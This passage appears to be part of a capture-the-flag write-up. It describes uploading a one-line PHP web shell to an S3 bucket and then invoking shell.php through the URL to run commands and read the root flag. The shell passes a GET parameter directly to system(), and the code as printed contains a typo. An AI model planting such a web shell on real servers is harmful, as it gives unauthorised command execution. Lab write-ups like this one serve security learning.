PHP

for obtaining the root flag, we had to write a small php code that would prompt a cmdlet for us to get the flag, however, we had to upload the code to the s3 bucket inorder to be able to access it.

The code we shall use is as follows.

```jsx
<?php system(_$GET['cmd']); ?>
```

we shall then access the shell.php file form the url in order to get our root flag
